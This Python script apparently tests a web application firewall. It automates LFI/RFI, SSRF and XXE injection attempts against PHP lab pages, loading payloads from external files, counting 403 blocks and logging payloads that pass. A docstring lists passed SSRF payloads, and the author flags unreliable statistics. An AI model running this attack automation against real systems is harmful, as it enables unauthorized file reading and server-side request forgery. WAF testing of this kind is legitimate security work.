from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
import time
import requests
import Utility


def execute(driver, target_url):
    # Start to attack
    lfi_rfi_attack(driver, target_url)
    ssrf_attack(driver, target_url)
    xxe_attack(driver, target_url)


def lfi_rfi_attack(driver, target_url):
    print(f"\n[+] Running LFI / RFI Injection Attacks")
    payload_path = 'Payloads/LFI_RFI_Injections.txt'

    # Adjust URL Injection Speed if needed, Lower is quicker
    injection_speed = 0.5

    # Calculate Amount Of PayLoads
    lines = Utility.calculate_file_lines(payload_path)
    blocked_by_waf_counter = 0

    # Getting Payloads and starting to inject into WAF
    with open(payload_path, 'r', encoding='cp1252') as lfi_payloads:

        for payload in lfi_payloads:
            attack_url_page = target_url + f'directory_traversal_2.php?directory={payload}'
            time.sleep(injection_speed)
            driver.get(attack_url_page)
            try:
                # Check if attack blocked by waf
                if Utility.check_if_element_exists(driver, "xpath", "/html/body/center/h1"):
                    if "403 Forbidden" == driver.find_element_by_xpath("/html/body/center/h1").text:
                        blocked_by_waf_counter += 1
                else:
                    Utility.write_to_log('LFI / RFI', payload)
            except NoSuchElementException:
                print("ERROR!")
                # print('[+] Path Traversal Attack passed: ', payload.strip())

    # for file in file_list:
    #     attack_url_page = target_url + f'directory_traversal_1.php?page={file}'
    #     driver.get(attack_url_page)
    #     try:
    #         # Catch WAF Blocking page
    #         waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
    #         if "403 Forbidden" == waf_block_message:
    #             blocked_by_waf_counter += 1
    #     except NoSuchElementException:
    #         print('[+] Path Traversal Attack passed: ', file)

        time.sleep(injection_speed)
        print(f"\n[!] ~~~Local File Inclusion / Remote File Inclusion [LFI / RFI] Results~~~ [!]")
        print(f"[+] Total Successful Attacks: ", lines - blocked_by_waf_counter)
        print(f"[+] Attacks Blocked by WAF:", blocked_by_waf_counter)


def ssrf_attack(driver, target_url):

    """
        Issue with Statistics, it counts only 2 Passed attack while 4 Passed
        Lines of payloads = 32
        Attacks Blocked by WAF:  30
        [+] Total Successful Attacks:  2

        [+] SSRF Injection Attacks
        [+] Server Side Request passed:  ./evil/ssrf-1.txt
        [+] Server Side Request passed:  localtest.me
        [+] Server Side Request passed:  sub1.sub2.sub3.localtest.me
    """
    print(f"\n[+] Running SSRF Injection Attacks")

    payload_path = 'Payloads/SSRF_Payloads.txt'
    machine_ip = Utility.get_ip_address_of_host(target_url)
    lines = Utility.calculate_file_lines(payload_path)
    injection_speed = 2
    blocked_by_waf_counter = 0

    # Getting Payloads and starting to inject into WAF

    driver.get(target_url + f'rlfi.php?language=lang_en.php&action=go')

    with open(payload_path, 'r', encoding='utf-8') as SSRF_payloads:
        for payload in SSRF_payloads:
            driver.get(target_url + f'rlfi.php?language={payload}&action=go?ip={machine_ip}')

            try:
                WebDriverWait(driver, injection_speed).until(EC.alert_is_present())
                # If Alert: switch_to.alert for switching to alert and accept
                alert_popped = driver.switch_to.alert
                if alert_popped:
                    # print('[+] Server Side Request passed: ', payload)
                    time.sleep(injection_speed)
                    Utility.write_to_log('SSRF', payload)
                    alert_popped.accept()

            except TimeoutException:
                try:
                    # Check if attack blocked by waf
                    if Utility.check_if_element_exists(driver, "xpath", "/html/body/center/h1"):
                        if "403 Forbidden" == driver.find_element_by_xpath("/html/body/center/h1").text:
                            blocked_by_waf_counter += 1
                    else:
                        Utility.write_to_log('SSRF', payload)

                except NoSuchElementException:
                    print("ERROR!")
                    # print('[+] Server Side Request passed: ', payload)

    # Statistics #
    time.sleep(injection_speed)
    print(f"\n[!] ~~~Server Side Request Forgery [SSRF] Results~~~ [!]")
    print(f"[+] Total Successful Attacks:", lines - blocked_by_waf_counter)
    print(f"[+] Attacks Blocked by WAF:", blocked_by_waf_counter)


def xxe_attack(driver, target_url):
    """
        TODO: To check why I have one Payload which went threw with status code 200.
        Might be False positive?
    """

    print('\n[+] Running XXE Attack Start')

    payload_path = 'Payloads/XXE_Payloads.txt'
    attack_url_page = '/xxe-1.php'
    injection_speed = 3
    blocked_by_waf_counter = 0

    driver.get(target_url + attack_url_page)

    time.sleep(injection_speed)  # Wait Cookies To load
    driver_cookies = Utility.get_cookie_from_driver(driver)

    with open(payload_path, 'r', encoding='utf-8') as xxe_payloads:
        payloads = xxe_payloads.read().split('\n\n')
        lines = len(payloads)

        for payload in payloads:
            res = requests.post(target_url + attack_url_page, cookies=driver_cookies, data=payload)
            if res.status_code == 403:
                blocked_by_waf_counter += 1
            elif res.status_code == 200:
                Utility.write_to_log('XXE', payload)

        # Statistics #
        time.sleep(injection_speed)
        print(f"\n[!] ~~~XML external entity [XXE] Results~~~ [!]")
        print(f"[+] Total Successful Attacks:", lines - blocked_by_waf_counter)
        print(f"[+] Attacks Blocked by WAF:", blocked_by_waf_counter)
